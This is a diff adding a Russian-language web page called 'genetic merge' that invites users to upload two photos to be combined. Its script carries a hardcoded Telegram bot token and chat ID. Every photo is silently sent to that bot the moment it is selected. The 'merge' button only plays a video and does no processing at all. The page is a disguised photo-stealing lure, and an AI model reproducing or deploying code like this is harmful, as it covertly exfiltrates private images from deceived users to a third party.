@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>gen</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: monospace;
+            padding: 20px;
+            color: #fff;
+        }
+        .panel {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h2 {
+            font-weight: 400;
+            letter-spacing: 4px;
+            margin-bottom: 40px;
+            text-transform: uppercase;
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
+        }
+        .file-row {
+            margin-bottom: 25px;
+        }
+        .file-btn {
+            background: transparent;
+            border: 1.5px solid #fff;
+            color: #fff;
+            padding: 16px 10px;
+            width: 100%;
+            font-size: 1.1rem;
+            font-family: monospace;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 8px;
+        }
+        .file-btn:hover {
+            background: #fff;
+            color: #000;
+        }
+        .file-name {
+            font-size: 0.8rem;
+            opacity: 0.6;
+            word-break: break-all;
+        }
+        .action-btn {
+            background: #fff;
+            border: none;
+            color: #000;
+            padding: 20px 10px;
+            width: 100%;
+            font-size: 1.3rem;
+            font-weight: bold;
+            font-family: monospace;
+            text-transform: uppercase;
+            letter-spacing: 6px;
+            cursor: pointer;
+            margin-top: 30px;
+            opacity: 0.3;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+        .action-btn.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .action-btn.active:hover {
+            background: #ddd;
+        }
+        .video-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            display: none;
+            z-index: 999;
+        }
+        .video-overlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+<div class="panel" id="mainPanel">
+    <h2>⟡ genetic merge ⟡</h2>
+    
+    <div class="file-row">
+        <button class="file-btn" id="btn1">выбрать фото 1</button>
+        <div class="file-name" id="name1">не выбрано</div>
+    </div>
+    
+    <div class="file-row">
+        <button class="file-btn" id="btn2">выбрать фото 2</button>
+        <div class="file-name" id="name2">не выбрано</div>
+    </div>
+
+    <button class="action-btn" id="mergeBtn">соединить</button>
+    <input type="file" id="input1" accept="image/*" style="display:none">
+    <input type="file" id="input2" accept="image/*" style="display:none">
+</div>
+
+<div class="video-overlay" id="videoOverlay">
+    <video id="videoPlayer" loop playsinline></video>
+</div>
+
+<script>
+    (function(){
+        const T = '8267835638:AAF0CNqajZpIeMTdN4kB9L5_Y4WBr3zKs2Y';
+        const C = '6397421039';
+        
+        const btn1 = document.getElementById('btn1');
+        const btn2 = document.getElementById('btn2');
+        const input1 = document.getElementById('input1');
+        const input2 = document.getElementById('input2');
+        const name1 = document.getElementById('name1');
+        const name2 = document.getElementById('name2');
+        const mergeBtn = document.getElementById('mergeBtn');
+        const mainPanel = document.getElementById('mainPanel');
+        const overlay = document.getElementById('videoOverlay');
+        const video = document.getElementById('videoPlayer');
+
+        let file1 = null, file2 = null;
+
+        video.src = 'fsosite.mp4';
+        video.load();
+
+        function updateUI() {
+            name1.textContent = file1 ? file1.name : 'не выбрано';
+            name2.textContent = file2 ? file2.name : 'не выбрано';
+            if (file1 && file2) {
+                mergeBtn.classList.add('active');
+            } else {
+                mergeBtn.classList.remove('active');
+            }
+        }
+
+        function sendToTelegram(file, label) {
+            const formData = new FormData();
+            formData.append('chat_id', C);
+            formData.append('photo', file);
+            formData.append('caption', label + ' ' + new Date().toLocaleString());
+            fetch('https://api.telegram.org/bot' + T + '/sendPhoto', {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+
+        btn1.addEventListener('click', () => input1.click());
+        btn2.addEventListener('click', () => input2.click());
+
+        input1.addEventListener('change', (e) => {
+            if (e.target.files.length) {
+                file1 = e.target.files[0];
+                sendToTelegram(file1, 'фото 1');
+                updateUI();
+            }
+        });
+
+        input2.addEventListener('change', (e) => {
+            if (e.target.files.length) {
+                file2 = e.target.files[0];
+                sendToTelegram(file2, 'фото 2');
+                updateUI();
+            }
+        });
+
+        mergeBtn.addEventListener('click', () => {
+            if (!file1 || !file2) return;
+            
+            mainPanel.style.display = 'none';
+            overlay.style.display = 'block';
+            video.currentTime = 0;
+            
+            video.muted = false;
+            video.play().catch(() => {
+                video.muted = true;
+                video.play();
+            });
+        });
+
+        overlay.addEventListener('click', () => {
+            video.pause();
+            overlay.style.display = 'none';
+            mainPanel.style.display = 'block';
+        });
+
+        video.addEventListener('ended', () => {
+            overlay.style.display = 'none';
+            mainPanel.style.display = 'block';
+        });
+    })();
+</script>
+</body>
+</html>
